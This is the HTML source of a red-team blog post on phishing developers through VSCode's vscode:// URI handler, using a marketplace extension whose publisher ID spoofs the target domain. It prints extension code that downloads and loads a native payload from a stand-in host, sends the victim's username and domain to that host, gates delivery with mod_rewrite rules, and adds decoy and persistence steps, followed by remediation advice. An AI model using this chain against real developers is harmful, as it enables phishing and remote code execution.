@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    
+    <title>Leveraging VSCode Extensions for Initial Access - breakfix.co</title>
+    
+    <meta name="description" content="Introduction On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.
+As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?
+Mapping the attack surface One of the main development applications used by the target organisation was VSCode.">
+    <meta name="author" content="">
+    
+    <link href="https://breakfix.co/an-old-hope.min.css" rel="stylesheet">
+    <link href="https://breakfix.co/style.css" rel="stylesheet">
+    <link href="https://breakfix.co/custom.css" rel="stylesheet">
+    
+    <link rel="apple-touch-icon" href="https://breakfix.co/apple-touch-icon.png">
+    <link rel="icon" href="https://breakfix.co/favicon.ico">
+    <meta name="generator" content="Hugo 0.80.0" />
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-66QLTNLGVX"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-66QLTNLGVX');
+</script>
+
+
+    <script>
+      function setTheme() {
+          document.body.classList.add('dark');
+          
+          return;
+        }
+    </script>
+  </head>
+  <body class="single">
+    <script>
+      setTheme();
+    </script>
+    <header class="header">
+      <nav class="nav">
+        <p class="logo"><a href="https://breakfix.co/">breakfix.co</a></p>
+        <ul class="menu">
+          <li>
+            <a href="/about/">About</a>
+          </li>
+        </ul>
+      </nav>
+    </header>
+    <main class="main">
+
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title">Leveraging VSCode Extensions for Initial Access</h1>
+    <div class="post-meta">August 1, 2023</div>
+  </header>
+  <div class="post-content"><h1 id="introduction">Introduction</h1>
+<p>On a recent Red Team engagement, MDSec were tasked with crafting a phishing campaign for initial access. The catch was that the in-scope phishing targets were developers with technical skills above that of the average user.</p>
+<p>As a result, they were unlikely to fall for typical payloads and pre-texts. Rather than relying on traditional initial access payloads, why not use their own development tools to our advantage ?</p>
+<h1 id="mapping-the-attack-surface">Mapping the attack surface</h1>
+<p>One of the main development applications used by the target organisation was VSCode. The ability to install custom VSCode extensions makes this an ideal target and is something we have previously <a href="https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/">talked about</a>.</p>
+<p>For our purposes, we wanted to find a method to install VSCode extensions that was more compatible with a phishing pre-text.</p>
+<p>VSCode allows installation of extensions via the below methods.</p>
+<ul>
+<li>VSCode UI
+<ul>
+<li>The most common way to install extensions using the Extensions view.</li>
+</ul>
+</li>
+<li>.VSIX Files
+<ul>
+<li>Manual installation using a pre-packaged <code>.vsix</code> extension file.</li>
+</ul>
+</li>
+<li>VSCode URI Handler
+<ul>
+<li>An undocumented method of installing extensions using the VSCode URI handler (more on this later).</li>
+</ul>
+</li>
+</ul>
+<h2 id="vscode-ui">VSCode UI</h2>
+<p>Extensions published to the VSCode Marketplace are searchable using the VSCode Extensions view.</p>
+<p><img src="/vscode/0c8fbe2b425dd08275a410512abce498.png" alt="0c8fbe2b425dd08275a410512abce498.png"></p>
+<p>Installation from here is straightforward and is likely the method most users are familiar with.</p>
+<p>This method is a little awkward to use in a phishing pre-text, as we have to walk the user through the steps required to find and install the extension.</p>
+<p>What about delivering a pre-packed extension file that can be opened directly ?</p>
+<h2 id="vsix">.VSIX</h2>
+<p>VSCode extensions are packaged into <code>.vsix</code> files for distribution, reading <a href="https://code.visualstudio.com/docs/editor/extension-marketplace#_install-from-a-vsix">the docs</a> we can see how to install them.</p>
+<p><img src="/vscode/1d5273965d587638c3c86be5585388ca.png" alt="1d5273965d587638c3c86be5585388ca.png"></p>
+<p>By default, VSCode does not associate itself with the <code>.vsix</code> file extension. As a result, we are not able to simply double-click a <code>.vsix</code> file to open it in VSCode. Instead, we need to rely on the <code>code.exe</code> command line.</p>
+<pre><code>code --install-extension myextension.vsix
+</code></pre><p>This requires the user to first download the <code>.vsix</code> file, open the command line, and run <code>code.exe</code> providing the path to the <code>.vsix</code> extension file.</p>
+<p>This was too many steps for our liking. We wanted something simpler&hellip;like clicking a link.</p>
+<h2 id="the-vscode-uri-handler">The vscode:// URI handler</h2>
+<p>Another method for installing extensions not mentioned in the VSCode docs is via the VSCode URI handler.</p>
+<p>The <code>vscode://</code> URI protocol handler is registered automatically when VSCode is installed. The tool <a href="https://www.nirsoft.net/utils/url_protocol_view.html">URLProtocolView</a> can be used to quickly discover the registered command-line arguments.</p>
+<p><img src="/vscode/8w26wc4dunaq6podpfzf8hy2g4u7ssx7.png" alt="8w26wc4dunaq6podpfzf8hy2g4u7ssx7.png"></p>
+<p>As Microsoft publish the VSCode source code online, we can browse the code <a href="https://github.com/microsoft/vscode">here</a> to find out how to interact with VSCode via the URI handler.</p>
+<p>When opening a URL such as <code>vscode://hellothere.test</code> from a browser, a prompt will first be shown to open the URL in VSCode.</p>
+<p><img src="/vscode/478ca224e21bb7c3415c2de75931a349.png" alt="478ca224e21bb7c3415c2de75931a349.png"></p>
+<p>After opening, the URL argument <code>vscode://hellothere.test</code> will be sent to the registered command line <code>&quot;%LOCALAPPDATA%\Programs\Microsoft VS Code\Code.exe&quot; &quot;--open-url&quot;  &quot;--&quot; &quot;vscode://hellothere.test&quot;</code>.</p>
+<p>The URL value will then be read inside of <code>/src/vs/code/electron-main/app.ts</code> by the <code>handleProtocolUrl</code> function.</p>
+<pre><code>private async handleProtocolUrl(windowsMainService: IWindowsMainService, urlService: IURLService, uri: URI, options?: IOpenURLOptions): Promise&lt;boolean&gt; {
+		// ...or if we should open in a new window and then handle it within that window
+		if (shouldOpenInNewWindow) {
+			this.logService.trace('app#handleProtocolUrl() opening empty window and passing in protocol url:', uri.toString(true));
+
+			const window = firstOrDefault(await windowsMainService.open({
+				context: OpenContext.API,
+				cli: { ...this.environmentMainService.args },
+				forceNewWindow: true,
+				forceEmpty: true,
+				gotoLineMode: true,
+				remoteAuthority: getRemoteAuthority(uri)
+			}));
+
+			await window?.ready();
+
+			return urlService.open(uri, options);
+		}
+}
+</code></pre><p>This value is then passed into <code>src\vs\workbench\services\url\browser\urlService.ts</code> via the <code>.open</code> method.</p>
+<p>The URL value is then forwarded to all other registered URL handler classes within VSCode. One such handler is <code>src/vs/workbench/services/extensions/browser/extensionUrlHandler.ts</code> used for interacting with installed extensions in VSCode.</p>
+<p>Extension URLs in VSCode are expected to be formatted as below.</p>
+<pre><code>   vscode://hellothere.test
+    \_/     \________/ \_/
+     |          |       |  
+  Scheme   PublisherID ExtensionName   
+</code></pre><p>The handler first checks if the URL is destined for an extension based on the below regular expression.</p>
+<pre><code>function isExtensionId(value: string): boolean {
+    return /^[a-z0-9][a-z0-9\-]*\.[a-z0-9][a-z0-9\-]*$/i.test(value);
+}
+</code></pre><p>If this passes, VSCode will then check if the extension is already installed.</p>
+<pre><code>	private async handleUnhandledURL(uri: URI, extensionIdentifier: IExtensionIdentifier, options?: IOpenURLOptions): Promise&lt;void&gt; {
+		const installedExtensions = await this.extensionManagementService.getInstalled();
+		let extension = installedExtensions.find(e =&gt; areSameExtensions(e.identifier, extensionIdentifier));
+
+		// Extension is not installed
+		if (!extension) {
+			let galleryExtension: IGalleryExtension | undefined;
+
+			try {
+				galleryExtension = (await this.galleryService.getExtensions([extensionIdentifier], CancellationToken.None))[0] ?? undefined;
+			} catch (err) {
+				return;
+			}
+</code></pre><p>If not, a POST request will be sent to the marketplace to search for the extension.</p>
+<pre><code>POST /_apis/public/gallery/extensionquery HTTP/1.1
+Host: marketplace.visualstudio.com
+Content-Length: 246
+Accept: application/json;api-version=3.0-preview.1
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Content-Type: application/json
+Origin: vscode-file://vscode-app
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+User-Agent: VSCode 1.81.0 (Code)
+Vscode-Sessionid: deb798674ec8308ff6b379e6d4fa3d7d3b26d8eaa0f4b6f41141356a382a601e
+X-Market-Client-Id: VSCode 1.81.0
+X-Market-User-Id: 96198178-9248-47eb-82d5-45ba1d0c07f1
+Sec-Ch-Ua: &quot;Not?A_Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;108&quot;
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: &quot;Windows&quot;
+
+{&quot;filters&quot;:[{&quot;criteria&quot;:[{&quot;filterType&quot;:7,&quot;value&quot;:&quot;CodeStream.codestream&quot;},{&quot;filterType&quot;:8,&quot;value&quot;:&quot;Microsoft.VisualStudio.Code&quot;},{&quot;filterType&quot;:12,&quot;value&quot;:&quot;4096&quot;}],&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1,&quot;sortBy&quot;:0,&quot;sortOrder&quot;:0}],&quot;assetTypes&quot;:[],&quot;flags&quot;:950}
+</code></pre><p>If a result is found, a URL pointing to the VSIX package location for the extension is returned.</p>
+<pre><code>{&quot;assetType&quot;:&quot;Microsoft.VisualStudio.Services.VSIXPackage&quot;,&quot;source&quot;:&quot;https://codestream.gallerycdn.vsassets.io/extensions/codestream/codestream/14.25.0/1691093003167/Microsoft.VisualStudio.Services.VSIXPackage&quot;},
+</code></pre><p>The user is then prompted to download and install the extension.</p>
+<p><img src="/vscode/ky3xr9p13ikxwy1ztxk2f0mdmguh7yf4.png" alt="ky3xr9p13ikxwy1ztxk2f0mdmguh7yf4.png"></p>
+<p>The <code>extensionsGallery</code> server value for the initial POST request is read from the <code>serviceUrl</code> variable stored in <code>%LOCALAPPDATA%\Programs\Microsoft VS Code\resources\app\product.json</code>.</p>
+<pre><code>    &quot;extensionsGallery&quot;: {
+        &quot;serviceUrl&quot;: &quot;https://marketplace.visualstudio.com/_apis/public/gallery&quot;,
+</code></pre><p>As a result, these extension search requests are limited to the VSCode marketplace.</p>
+<p>The question then becomes, how do we get an extension into the marketplace ?</p>
+<h2 id="publishing-to-the-vscode-marketplace">Publishing to the VSCode marketplace</h2>
+<p>In order to publish our extension, we first need to head over to <a href="https://marketplace.visualstudio.com/manage">https://marketplace.visualstudio.com/manage</a> and login with our Microsoft account (free or trial accounts will do, no specific license is required).</p>
+<p>After signing in, we are prompted to provide the below information to create a publisher.</p>
+<p><img src="/vscode/6b60e925df67128e281a70ed6b816039.png" alt="6b60e925df67128e281a70ed6b816039.png"></p>
+<ul>
+<li>Name of the publisher (must be unique, <strong>can</strong> be changed and cannot contain dots <code>.</code> )</li>
+<li>Publisher ID (must be unique, <strong>cannot</strong> be changed and cannot contain dots <code>.</code>)</li>
+<li>Verified domain (optional)</li>
+</ul>
+<p>The <code>Publisher ID</code> value provided here will be included in the <code>vscode://</code> URL used to install the extension, along with the extension&rsquo;s name. The URL will appear as follows, with a single dot <code>.</code> separating the two values:</p>
+<p><code>vscode://publisherid.extensionname</code></p>
+<p>The key thing to note here is that although Microsoft provides an option to verifiy ownership of a domain, this is simply an optional step to mark our account as <a href="https://code.visualstudio.com/api/working-with-extensions/publishing-extension#verify-a-publisher">&ldquo;verified&rdquo;</a> and has no bearing on what we can set in the <code>Publisher ID</code> field.</p>
+<p>As a result, we can set our <code>Publisher ID</code> to match our target domain without needing to provide any domain validation (as mentioned we cannot include any dots <code>.</code> but we will work around that shortly).</p>
+<p><strong>Note:</strong> The <code>Name</code> field is largely irrelevant for our use case as it won&rsquo;t appear in the extension URL.</p>
+<p><img src="/vscode/282d7c2393e0f6e4b9862fca41a564c0.png" alt="282d7c2393e0f6e4b9862fca41a564c0.png"></p>
+<p>With our publisher created, we are then able to upload a compiled <code>.vsix</code> extension file which will be scanned by Microsoft.</p>
+<p><img src="/vscode/e2675a8b7316d3e47ee1464eafec7722.png" alt="e2675a8b7316d3e47ee1464eafec7722.png"></p>
+<p>The name of our extension is defined within the extension&rsquo;s <code>package.json</code> file and will be included in the VSCode URL.</p>
+<p><code>vscode://targetdomain.extensionname</code></p>
+<p>As the extension name does not need to be unique, we can use this to spoof a given top-level domain (such as <code>com</code>). This will result in the following VSCode URL.</p>
+<p><code>vscode://targetdomain.com</code></p>
+<p>When the URL is opened in VSCode, the below prompt will be shown to the user containing the extensions <code>Display Name</code>, in our case <code>com</code>.</p>
+<p><img src="/vscode/jgo2ii893grsndp9nlwpdrc3phcfpya9.png" alt="jgo2ii893grsndp9nlwpdrc3phcfpya9.png"></p>
+<p>We can improve upon this further as the extension&rsquo;s <code>Display Name</code> is defined within the <code>package.json</code> file and is separate from the <code>name</code> value contained in the URL.</p>
+<pre><code>  &quot;name&quot;: &quot;com&quot;,
+  &quot;displayName&quot;: &quot;My Extension Name&quot;
+</code></pre><p>By changing the <code>DisplayName</code> value, the below prompt will then be shown without altering our extension URL of <code>vscode://targetdomain.com</code></p>
+<p><img src="/vscode/6adumn48gdc4nfx5c3itn4wekmi4e8sq.png" alt="6adumn48gdc4nfx5c3itn4wekmi4e8sq.png"></p>
+<p>In addition, any parameters appended to the URL will essentially be ignored (as they are simply passed to the extension by VSCode). This means we can construct the below URL in order to provide some additional context to our phish.</p>
+<p><code>vscode://targetdomain.com/internal/path.html?login=true</code></p>
+<p>When clicked, VSCode will open and show the prompt below.</p>
+<p><img src="/vscode/6hjev6j95j7a02sw44r9976dzf9b6k6r.png" alt="6hjev6j95j7a02sw44r9976dzf9b6k6r.png"></p>
+<p>At this point, we can begin writing our extension code.</p>
+<h1 id="extension-code">Extension code</h1>
+<p>We will create our extension using the <a href="https://www.npmjs.com/package/generator-code">VS Code Extension Generator</a> and NodeJS. This step is already covered in our previously mentioned <a href="https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions">post</a> so we won&rsquo;t go into too much detail here.</p>
+<p>The key thing to note is the name of our extension <code>com</code> which we will use to spoof the final extension URL.</p>
+<pre><code>C:\Users\mattjohnson&gt;yo code
+
+     _-----_     ╭──────────────────────────╮
+    |       |    │   Welcome to the Visual  │
+    |--(o)--|    │   Studio Code Extension  │
+   `---------´   │        generator!        │
+    ( _´U`_ )    ╰──────────────────────────╯
+    /___A___\   /
+     |  ~  |
+   __'.___.'__
+ ´   `  |° ´ Y `
+
+? What type of extension do you want to create? New Extension (JavaScript)
+? What's the name of your extension? com
+? What's the identifier of your extension? com
+? What's the description of your extension? Description
+? Enable JavaScript type checking in 'jsconfig.json'? No
+? Initialize a git repository? No
+? Which package manager to use? npm
+
+Writing in C:\Users\mattjohnson\com...
+   create com\.vscode\extensions.json
+   create com\.vscode\launch.json
+   create com\test\runTest.js
+   create com\test\suite\extension.test.js
+   create com\test\suite\index.js
+   create com\.vscodeignore
+   create com\README.md
+   create com\CHANGELOG.md
+   create com\vsc-extension-quickstart.md
+   create com\jsconfig.json
+   create com\extension.js
+   create com\package.json
+   create com\.eslintrc.json
+
+</code></pre><p>After the template code is generated, we need to define our publisher in <code>package.json</code> to match our <code>publisherID</code> value, or we will get an error when uploading the <code>.vsix</code> file.</p>
+<pre><code>  &quot;name&quot;: &quot;com&quot;,
+  &quot;displayName&quot;: &quot;My Extension Name&quot;,
+  &quot;publisher&quot;: &quot;targetdomain&quot;,
+</code></pre><p>Inside of <code>extension.js</code>, we have many options available for code execution. One that fits into well with our existing toolset at MDSec is to leverage <a href="https://nodejs.org/api/addons.html">Node Native-Addons</a>.</p>
+<p>Native-Addons are essentially DLLs intended to provide an interface between JavaScript running in Node.js and libraries written in C or C++. These can be loaded into our extension process via the use of the <code>require()</code> function.</p>
+<p>Our activate method for our extension is below, fetching a remote Node Native-Addon from a remote server, writing it to disk and loading it into our extension process via our call to <code>require()</code>.</p>
+<p><strong>Note</strong>: WebDAV / UNC paths are supported via <code>require()</code>, so we can also use this to avoid writing to disk, however, this does come with some caveats around the WebClient service.</p>
+<pre><code>// This method is called when your extension is activated
+// Your extension is activated the very first time the command is executed
+
+/**
+ * @param {vscode.ExtensionContext} context
+ */
+function activate(context) {
+
+	function get_data(data, outfile){
+		fs.writeFileSync(outfile, data);
+		if(outfile.endsWith(&quot;.node&quot;)){
+			require(process.env.LOCALAPPDATA + &quot;/encoding.node&quot;);
+		}
+	}
+	
+	async function get_module(path, outfile) {
+	
+		var options = {
+			hostname: &quot;server.com&quot;,
+			path: path,
+			port: 443,
+			};
+	
+		return new Promise((resolve) =&gt; {
+	
+			https.get(options, res =&gt; {
+	
+				var data = [];
+	
+				res.on('data', function(chunk) {
+					data.push(chunk);
+				}).on('end', function() {
+					var buffer = Buffer.concat(data);
+					get_data(buffer, outfile);
+				});
+			}) 
+		})
+	}
+	
+	(async () =&gt; await get_module(&quot;/api/v1/custom.js&quot;, process.env.LOCALAPPDATA + &quot;/encoding.node&quot;))();
+</code></pre><p>In order to further expand our pre-text, we can optionally configure our extension to open a decoy file on disk inside of VSCode after the extension installs.</p>
+<pre><code>		var openPath = vscode.Uri.parse(&quot;file:///&quot; + outfile);
+		
+		vscode.workspace.openTextDocument(openPath).then(doc =&gt; {
+		vscode.window.showTextDocument(doc);
+		});
+</code></pre><p>This can be useful to help prevent raising suspicion from our target victim.</p>
+<h1 id="limiting-execution">Limiting execution</h1>
+<p>In order to limit execution of our malicious extension to our target organisation, we will include some additional client side checks before running our payload.</p>
+<p>The advantage of this approach is two fold. One, our attack is limited to our target domain and two, we can potentially bypass any automated code scanning.</p>
+<p>To achieve this, we add the below code to our extension to fetch the required environment variables from our target and send them to our remote server.</p>
+<pre><code>	async function get_module(path, outfile) {
+	
+		var options = {
+			hostname: &quot;server.com&quot;,
+			path: path,
+			port: 443,
+			headers: {
+			  'X-VSCode-Domain': process.env.USERDOMAIN,
+			  'X-VSCode-User': process.env.USERNAME,
+			  'X-VSCode-Arch': process.env.PROCESSOR_ARCHITECTURE
+			  }
+			};
+</code></pre><p>On the server side, we can use the below Apache mod_rewrite rules to ensure we deliver the malicious <code>.node</code> file, only when the required conditions are met. If not, we deliver a benign <code>.node</code> file.</p>
+<pre><code># If domain is correct
+RewriteCond %{HTTP:X-VSCode-Domain} =targetdomain
+# And username is correct
+RewriteCond %{HTTP:X-VSCode-User} =victim
+# Then send payload
+RewriteRule ^.*$ &quot;/files/payload.node&quot; [END]
+# Else send benign file
+RewriteRule ^.*$ &quot;/files/fake.node&quot; [END]
+</code></pre><h1 id="user-compromise">User compromise</h1>
+<p>Once our <code>.vsix</code> file is compiled, we can upload it to our marketplace publisher account.</p>
+<p><img src="/vscode/221587e31f8e4177f0085b536dda7e96.png" alt="221587e31f8e4177f0085b536dda7e96.png"></p>
+<p>After automated analysis is completed, the extension will become available.</p>
+<p><img src="/vscode/800c65b2b2e0d7ee42148eb912084beb.png" alt="800c65b2b2e0d7ee42148eb912084beb.png"></p>
+<p>At this stage we can deliver our phishing link to the target using the below URL, appending any additional parameters as needed.</p>
+<p><code>vscode://targetdomain.com/internal/login.html</code></p>
+<p>After clicking on the link, the user will be prompted to open VSCode.</p>
+<p><img src="/vscode/zqbqwedxcfahih682juu5y1dkufpzse6.png" alt="zqbqwedxcfahih682juu5y1dkufpzse6.png"></p>
+<p>If they click on &ldquo;Install and Open&rdquo;, our extension will be installed and our <code>extension.js</code> code will execute from within <code>Code.exe</code>.</p>
+<p>The below illustrates the end-to-end chain, establishing a C2 connection and displaying a decoy file inside of VSCode.</p>
+<p><img src="/vscode/endtoend.gif" alt="endtoend.gif"></p>
+<h1 id="persistence-via-extension-updates">Persistence via extension updates</h1>
+<p>By default, VSCode will update extensions automatically if an update is available. If we want to make a change to the extension code, we simply need to recompile our <code>.vsix</code> and upload the new version to the marketplace.</p>
+<p>Once caveat with this approach is that after the extension has been updated, we will need to wait for VSCode to restart in order for the new extension code to be executed.</p>
+<p>We can work around this by adding the below line into our extension to force a refresh of VSCode if a certain condition is met.</p>
+<p><code>vscode.commands.executeCommand('workbench.action.reloadWindow');</code></p>
+<h1 id="cleanup">Cleanup</h1>
+<p>Currently, there appears to be no way to remove a publisher from the marketplace using the web interface. Instead, the below steps can be used to remove it using <code>vsce</code>.</p>
+<p>First, create a personal access token from the Azure dev portal <a href="https://dev.azure.com/">https://dev.azure.com/</a></p>
+<p><img src="/vscode/uqd40lrto4orr6j4nsfbgtjzcz22vg5x.png" alt="uqd40lrto4orr6j4nsfbgtjzcz22vg5x.png"></p>
+<p>Then set the below scopes.</p>
+<p><img src="/vscode/5pbujq9xxncrjaad3mavuv0y5vwsry5f.png" alt="5pbujq9xxncrjaad3mavuv0y5vwsry5f.png"></p>
+<p>Finally, use the below <code>vsce</code> command to remove the publisher providing the token when prompted.</p>
+<pre><code>C:\Users\mattjohnson&gt;vsce delete-publisher targetdomain
+https://marketplace.visualstudio.com/manage/publishers/
+Personal Access Token for publisher 'targetdomain': ****************************************************
+
+The Personal Access Token verification succeeded for the publisher 'targetdomain'.
+This will FOREVER delete 'targetdomain'! Are you sure? [y/N] y
+ DONE  Deleted publisher 'targetdomain'.
+</code></pre><h1 id="remediation">Remediation</h1>
+<p>The techniques described here leverage intended functionality of both VSCode and the VSCode Marketplace. Further validation could be performed by Microsoft by limiting Publisher IDs to verified domains only, preventing the domain impersonation issue.</p>
+<p>Microsoft MSRC was contacted with the details of the post prior to publication but did not respond before the proposed disclosure deadline.</p>
+<p>As an additional hardening measure, the VSCode URI handler can be disabled by clearing the registry key at the below path.</p>
+<pre><code>Computer\HKEY_CLASSES_ROOT\vscode\shell\open\command
+</code></pre><p>This will prevent external URLs from being able to be opened inside of VSCode.</p>
+<p><strong>This article was also posted on <a href="https://www.mdsec.co.uk/2023/08/leveraging-vscode-extensions-for-initial-access/">mdsec.co.uk</a></strong></p>
+</div>
+  
+</article></main>
+<footer class="footer">
+  <span>&copy; 2024 <a href="https://breakfix.co/">breakfix.co</a></span>
+  <span>&middot;</span>
+  <span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️</span>
+  <span>&middot;</span>
+  <span>Theme️ <a href="https://github.com/nanxiaobei/hugo-paper" rel="noopener" target="_blank">Paper</a></span>
+</footer>
+<script src="https://breakfix.co/highlight.min.js"></script>
+<script>
+  hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
